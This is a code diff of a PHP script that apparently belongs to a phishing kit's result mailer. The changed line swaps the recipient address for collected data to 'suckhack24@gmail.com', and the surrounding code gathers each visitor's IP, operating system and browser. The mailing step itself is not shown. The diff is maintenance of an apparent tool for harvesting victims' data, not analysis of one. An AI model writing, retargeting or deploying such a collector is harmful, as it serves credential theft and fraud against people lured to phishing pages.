@@ -1,6 +1,6 @@
 <?php
 
-$to = "resultcogan@gmail.com";
+$to = "suckhack24@gmail.com";
 
 
 ##ip##
@@ -47,7 +47,7 @@ $user_agent     =   $_SERVER['HTTP_USER_AGENT'];
 
 ##OS##
 
-function getOS() { 
+function getOS() {
     global $user_agent;
     $os_platform    =   "Unknown OS Platform";
     $os_array       =   array(
@@ -75,11 +75,11 @@ function getOS() {
                             '/blackberry/i'         =>  'BlackBerry',
                             '/webos/i'              =>  'Mobile'
                         );
-    foreach ($os_array as $regex => $value) { 
+    foreach ($os_array as $regex => $value) {
         if (preg_match($regex, $user_agent)) {
             $os_platform    =   $value;
         }
-    }   
+    }
     return $os_platform;
 }
 
@@ -102,7 +102,7 @@ function getBrowser() {
                             '/konqueror/i'  =>  'Konqueror',
                             '/mobile/i'     =>  'Handheld Browser'
                         );
-    foreach ($browser_array as $regex => $value) { 
+    foreach ($browser_array as $regex => $value) {
         if (preg_match($regex, $user_agent)) {
             $browser    =   $value;
         }
